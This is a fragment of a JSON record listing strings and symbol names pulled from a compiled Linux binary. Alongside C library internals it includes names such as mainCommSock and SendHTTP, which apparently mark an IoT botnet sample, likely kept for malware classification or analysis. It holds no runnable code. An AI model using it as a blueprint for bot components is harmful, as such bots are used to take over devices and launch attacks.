                "lseek64",
                "open",
                "toupper",
                "__libc_write",
                "__malloc_consolidate",
                "_ppfs_parsespec",
                "__GI_strtol",
                "__GI_getuid",
                "__GI_strtok_r",
                "__GI_errno",
                "__libc_sendto",
                "__stdio_trans2w_o",
                "__GI_vfork",
                "strchr",
                "__GI_rawmemchr",
                "__GI_raise",
                "__data_start",
                "__GI_inet_addr",
                "__GI_seteuid",
                "__encode_dotted",
                "__GI_strnlen",
                "_Jv_RegisterClasses",
                "macAddress",
                "__GI___errno_location",
                "fcntl",
                "setuid",
                "read_with_timeout",
                "__GI_fdopen",
                "__GI_atoi",
                "fseeko64",
                "__GI_sprintf",
                "__ctype_tolower",
                "wcrtomb",
                "close",
                "__libc_connect",
                "__GI_strlen",
                "mainCommSock",
                "pids",
                "SendHTTP",
                "strpbrk",
                "_load_inttype",
                "raise",
                "free",
                "sigprocmask",
                " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~",
                ")+- ",
                " !\"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
            ]
        }
    ]
}